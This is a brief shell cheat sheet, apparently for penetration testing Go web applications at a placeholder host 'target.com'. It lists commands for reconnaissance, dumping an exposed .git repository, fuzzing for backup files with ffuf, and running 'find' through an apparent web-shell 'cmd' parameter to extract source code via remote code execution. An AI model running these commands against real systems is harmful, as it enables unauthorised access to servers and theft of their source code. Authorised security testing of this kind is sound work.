cd ~/go-pentest

# Full recon
./go_source_recon.sh http://target.com

# Quick git check only
curl -s http://target.com/.git/HEAD && ./gitdumper.sh http://target.com/.git ./dump

# Backup hunt only
ffuf -u http://target.com/FUZZ -w go_wordlist.txt -mc 200

# RCE source dump
curl "http://target.com/?cmd=find%20/ -name '*.go' | head -10"
